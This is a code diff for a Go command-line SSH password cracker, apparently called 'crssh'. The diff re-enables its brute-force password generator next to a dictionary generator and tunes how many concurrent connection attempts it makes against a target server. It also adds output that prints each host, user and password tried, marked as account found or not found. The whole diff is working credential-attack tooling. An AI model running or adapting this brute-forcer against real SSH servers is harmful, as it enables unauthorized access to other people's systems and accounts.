@@ -9,7 +9,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/briandowns/spinner"
 	"github.com/hlts2/gobf"
 	"github.com/hlts2/godict"
 	"github.com/spf13/cobra"
@@ -18,7 +17,8 @@ import (
 )
 
 const (
-	version = "v0.0.1"
+	version                    = "v0.0.1"
+	concurrencyConnectionLimit = 4
 )
 
 type passCracker = gobf.BruteForce
@@ -75,26 +75,22 @@ var rootCmd = &cobra.Command{
 				return godict.New()
 			},
 
-			// // generator for brute force attack.
-			// func() (passCracker, error) {
-			// 	return gobf.New(
-			// 		gobf.WithUpper(true),
-			// 		gobf.WithLower(true),
-			// 		gobf.WithNumber(true),
-			// 		gobf.WithSize(int(size)),
-			// 		gobf.WithConcrencyLimit(100000),
-			// 	)
-			// },
+			// generator for brute force attack.
+			func() (passCracker, error) {
+				return gobf.New(
+					gobf.WithUpper(true),
+					gobf.WithLower(true),
+					gobf.WithNumber(true),
+					gobf.WithSize(int(size)),
+					gobf.WithConcrencyLimit(100000),
+				)
+			},
 		}
-
-		s := spinner.New(spinner.CharSets[4], 100*time.Millisecond)
-		s.Start()
-		defer s.Stop()
 
 		ctx, cancel := context.WithCancel(cmd.Context())
 		defer cancel()
 
-		limit := make(chan struct{}, 8)
+		limit := make(chan struct{}, concurrencyConnectionLimit)
 
 		eg, egctx := errgroup.WithContext(ctx)
 
@@ -132,12 +128,13 @@ var rootCmd = &cobra.Command{
 
 						conn, err := ssh.Dial("tcp", host+":"+strPort, config)
 						if err != nil {
+							printStats(pass, err)
 							return nil
 						}
 						defer conn.Close()
 						cancel()
 
-						fmt.Printf(" Successful connection to ssh server.  password: %s\n", pass)
+						printStats(pass, nil)
 						return nil
 					})
 				})
@@ -153,6 +150,15 @@ var rootCmd = &cobra.Command{
 
 		return err
 	},
+}
+
+func printStats(pass string, err error) {
+	str := fmt.Sprintf("[crssh] Host: %s\tUser: %s\tPassword: %s", host, user, pass)
+	if err != nil {
+		fmt.Printf("\033[32mACCOUNT NOT FOUND: %s\tError: %s\n\033[39m", str, err.Error())
+	} else {
+		fmt.Printf("\033[31mACCOUNT FOUND: %s\n\033[39m", str)
+	}
 }
 
 // TODO: Add processing for ipv6.
